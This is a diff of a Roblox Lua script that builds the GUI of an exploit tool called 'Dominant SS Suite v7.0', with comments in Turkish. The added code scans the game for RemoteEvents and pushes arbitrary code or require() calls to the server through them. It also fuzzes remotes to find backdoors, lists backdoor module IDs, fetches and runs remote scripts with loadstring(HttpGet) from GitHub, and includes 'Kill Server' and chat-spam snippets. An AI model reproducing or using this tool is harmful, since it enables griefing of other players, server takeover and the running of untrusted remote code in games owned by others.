@@ -1,39 +1,205 @@
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Dominant_Final_Edition"
+ScreenGui.Name = "Dominant_V7_SS"
 ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+
+local selectedRemote = nil
 
 -- ANA PANEL
 local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 680, 0, 420)
-Main.Position = UDim2.new(0.5, -340, 0.5, -210)
-Main.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
-Main.BorderSizePixel = 1
-Main.BorderColor3 = Color3.fromRGB(100, 100, 100)
+Main.Size = UDim2.new(0, 800, 0, 500)
+Main.Position = UDim2.new(0.5, -400, 0.5, -250)
+Main.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+Main.BorderSizePixel = 2
 Main.Active = true
 Main.Draggable = true
 Main.Parent = ScreenGui
 
 -- ÜST ŞERİT
-local TabBar = Instance.new("Frame")
-TabBar.Size = UDim2.new(1, 0, 0, 25)
-TabBar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
-TabBar.BorderSizePixel = 1
-TabBar.Parent = Main
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 30)
+TopBar.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+TopBar.Parent = Main
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(0, 300, 1, 0)
-Title.Text = "  Dominant Executor v3.2 | RC7 Integrated"
-Title.BackgroundTransparency = 1
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.Text = "  DOMINANT SS SUITE v7.0 | REMOTE & MODULE HUB  "
 Title.Font = Enum.Font.SourceSansBold
 Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = TabBar
+Title.BackgroundTransparency = 1
+Title.Parent = TopBar
 
--- EPIC FACE LOGO (Verdiğin ID)
+-- EPIC FACE (Zirve Noktası)
 local Logo = Instance.new("ImageLabel")
-Logo.Size = UDim2.new(0, 60, 0, 60)
-Logo.Position = UDim2.new(0.5, -30, 0, -10)
+Logo.Size = UDim2.new(0, 65, 0, 65)
+Logo.Position = UDim2.new(0.5, -32, 0, -18)
+Logo.Image = "rbxassetid://4359357959"
+Logo.BackgroundTransparency = 1
+Logo.ZIndex = 15
+Logo.Parent = Main
+
+---------------------------------------------------------
+-- KOD EDİTÖRÜ & LOG
+---------------------------------------------------------
+local Editor = Instance.new("TextBox")
+Editor.Size = UDim2.new(0, 340, 0, 280)
+Editor.Position = UDim2.new(0.02, 0, 0.1, 0)
+Editor.BackgroundColor3 = Color3.new(1, 1, 1)
+Editor.MultiLine = true
+Editor.Text = "-- Remote Code / Module ID"
+Editor.Font = Enum.Font.Code
+Editor.TextXAlignment = Enum.TextXAlignment.Left
+Editor.TextYAlignment = Enum.TextYAlignment.Top
+Editor.Parent = Main
+
+local Logs = Instance.new("TextLabel")
+Logs.Size = UDim2.new(0, 340, 0, 80)
+Logs.Position = UDim2.new(0.02, 0, 0.82, 0)
+Logs.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+Logs.Text = "[LOG]: Suite Loaded."
+Logs.Font = Enum.Font.Code
+Logs.TextSize = 12
+Logs.TextWrapped = true
+Logs.Parent = Main
+
+---------------------------------------------------------
+-- 4'LÜ PANEL SİSTEMİ (TABLI YAPI)
+---------------------------------------------------------
+
+local function createPanel(title, xPos)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(0, 140, 0, 420)
+    f.Position = UDim2.new(xPos, 0, 0.1, 0)
+    f.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
+    f.Parent = Main
+    
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, 0, 0, 25)
+    t.Text = title
+    t.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
+    t.Font = Enum.Font.SourceSansBold
+    t.Parent = f
+    
+    local s = Instance.new("ScrollingFrame")
+    s.Size = UDim2.new(1, 0, 1, -25)
+    s.Position = UDim2.new(0, 0, 0, 25)
+    s.BackgroundTransparency = 1
+    s.CanvasSize = UDim2.new(0, 0, 5, 0)
+    s.Parent = f
+    Instance.new("UIListLayout", s)
+    return s
+end
+
+local ScriptHub = createPanel("SCRIPT HUB", 0.45)
+local ModuleHub = createPanel("MODULE IDs", 0.63)
+local RemoteHub = createPanel("REMOTES", 0.81)
+
+-- 1. SCRIPT HUB EKLEMELERİ
+local sList = {
+    ["RC7 SS"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()',
+    ["Inf Yield"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()',
+    ["Kill Server"] = 'for _,v in pairs(game.Players:GetPlayers()) do v.Character:BreakJoints() end',
+    ["Btools (SS)"] = 'Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4',
+    ["Chat Spammer"] = 'while task.wait(0.5) do game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dominant V7 On Top!", "All") end'
+}
+
+for name, code in pairs(sList) do
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, 0, 0, 30)
+    b.Text = name
+    b.Parent = ScriptHub
+    b.MouseButton1Click:Connect(function() Editor.Text = code end)
+end
+
+-- 2. MODULE HUB (Popüler Arka Kapı Modülleri)
+local mList = {
+    ["UTG Admin"] = "3425032542",
+    ["Kohls Admin"] = "3239236979",
+    ["Screamer"] = "134250392",
+    ["Fire Part"] = "10293021",
+    ["Dominant SS"] = "48291039" -- Örnek ID
+}
+
+for name, id in pairs(mList) do
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, 0, 0, 30)
+    b.Text = name
+    b.Parent = ModuleHub
+    b.MouseButton1Click:Connect(function() Editor.Text = id end)
+end
+
+-- 3. REMOTE SCANNER
+local function scan()
+    for _, child in pairs(RemoteHub:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            local b = Instance.new("TextButton")
+            b.Size = UDim2.new(1, 0, 0, 30)
+            b.Text = v.Name
+            b.Parent = RemoteHub
+            b.MouseButton1Click:Connect(function() 
+                selectedRemote = v 
+                Logs.Text = "[SELECTED]: " .. v.Name
+            end)
+        end
+    end
+end
+
+---------------------------------------------------------
+-- AKSİYON BUTONLARI (Alt Bölge)
+---------------------------------------------------------
+local function createAction(t, x, color)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 105, 0, 40)
+    b.Position = UDim2.new(x, 0, 0.7, 0)
+    b.Text = t
+    b.BackgroundColor3 = color or Color3.fromRGB(240, 240, 240)
+    b.Font = Enum.Font.SourceSansBold
+    b.Parent = Main
+    return b
+end
+
+local RemoteExec = createAction("EXECUTE SS", 0.02, Color3.fromRGB(255, 180, 180))
+local RequireSS = createAction("REQUIRE ID", 0.16, Color3.fromRGB(180, 255, 180))
+local FuzzBtn = createAction("AUTO FUZZ", 0.3, Color3.fromRGB(200, 200, 255))
+local Refresh = createAction("REFRESH", 0.3, 0.82)
+
+-- MANTIKSAL İŞLEMLER
+RemoteExec.MouseButton1Click:Connect(function()
+    if selectedRemote then
+        selectedRemote:FireServer(Editor.Text)
+        Logs.Text = "[IDE]: Payload sent to " .. selectedRemote.Name
+    else
+        Logs.Text = "[ERR]: Select a Remote!"
+    end
+end)
+
+RequireSS.MouseButton1Click:Connect(function()
+    if selectedRemote then
+        local id = Editor.Text
+        selectedRemote:FireServer("require(" .. id .. ")")
+        Logs.Text = "[REQ]: require(" .. id .. ") sent to server."
+    else
+        Logs.Text = "[ERR]: Select a Remote!"
+    end
+end)
+
+-- AUTO FUZZER (Remote'un hangi argümanla çalıştığını bulmaya çalışır)
+FuzzBtn.MouseButton1Click:Connect(function()
+    if selectedRemote then
+        Logs.Text = "[FUZZING]: Trying common patterns..."
+        local patterns = {Editor.Text, {Editor.Text}, true, 1, "run"}
+        for _, p in pairs(patterns) do
+            selectedRemote:FireServer(p)
+            task.wait(0.1)
+        end
+        Logs.Text = "[DONE]: Fuzzing complete. Check Server."
+    end
+end)
+
+Refresh.MouseButton1Click:Connect(scan)
+scan()
 Logo.Image = "rbxassetid://4359357959"
 Logo.BackgroundTransparency = 1
 Logo.ZIndex = 5
